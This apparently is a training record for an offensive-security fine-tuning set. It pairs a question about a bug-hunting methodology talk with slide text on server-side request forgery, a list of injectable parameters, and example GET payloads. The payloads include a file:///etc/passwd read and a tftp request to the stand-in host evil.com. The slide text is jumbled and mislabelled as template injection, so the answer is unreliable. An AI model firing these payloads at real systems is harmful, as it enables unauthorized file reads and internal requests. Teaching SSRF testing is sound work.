# SSRF — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: ssrf
- cwe: CWE-918

## Scenario

What should a web pentester know about Bug Hunter's Methodology v2: Jinja2 Template Injection -?

## Analysis / Response

Based on Bug Hunter's Methodology v2 (Jinja2 Template Injection -):

Jinja2 Template Injection -
               Orange Tsai

Server Side Request
      Forgery

 SSRF                                                       Common Parameters or Injection
                                                                points from TBHMv1
  TBHMv1                   ★ Where?                        file=            folder=
❏ Nothing                  ★ Resources
❏ Well kinda... SSRF          ○ SSRF Bible (black magic)
                                                           location=        style=

  (visually) looks very    ★ Exploit                       locale=          template=
  similar to LFI / RFI /      ○ Burp Collaborator
  Path/dir Traversal!      ★ Honourable mention:
                                                           path=            doc=

❏ REMIX!                      ○                            display=         source=

                              ○ ^ “Blind detection of      load=            pdf=
                                  path
                                  traversal-vulnerable     read=            dest=

                                  file uploads”            retrieve=        continue=

SSRF (GET examples)
http://ACME.com/redirect.php?url=http://google.com
http://ACME.com/redirect.php?url=//google.com
http://ACME.com/redirect.php?url=google.com
http://ACME.com/redirect.php?url=/PATH/SOMETHING/here

                   http://ACME.com/redirect.php?url=file:///etc/passwd
              http://acme.com/ssrf.php?url=tftp://evil.com:12346/TESTPACKET

Use these techniques only on systems you are authorized to test; capture evidence and include remediation in your report. Always stay within authorized scope, document evidence carefully, and prefer non-destructive verification (harmless canaries, OOB callbacks you control, and clear remediation guidance for the asset owner).
